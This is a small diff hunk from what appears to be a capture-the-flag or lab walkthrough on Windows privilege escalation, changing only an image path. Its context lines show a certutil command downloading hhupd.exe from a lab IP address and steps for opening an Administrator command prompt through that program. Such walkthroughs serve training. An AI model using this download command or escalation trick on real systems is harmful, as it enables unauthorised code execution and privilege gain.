@@ -495,7 +495,7 @@ certutil -urlcache -f http://10.10.162.126:81/hhupd.exe hhupd.exe
 
 Navigate to **C:\Windows\System32** and type in **\*.\*** to show all files.
 
-<figure><img src="../../.gitbook/assets/image (34) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (34) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 Open the cmd prompt and it open as an Administrator account, but note if you already had Internet explorer open it won't work so make sure it is closed before starting
 
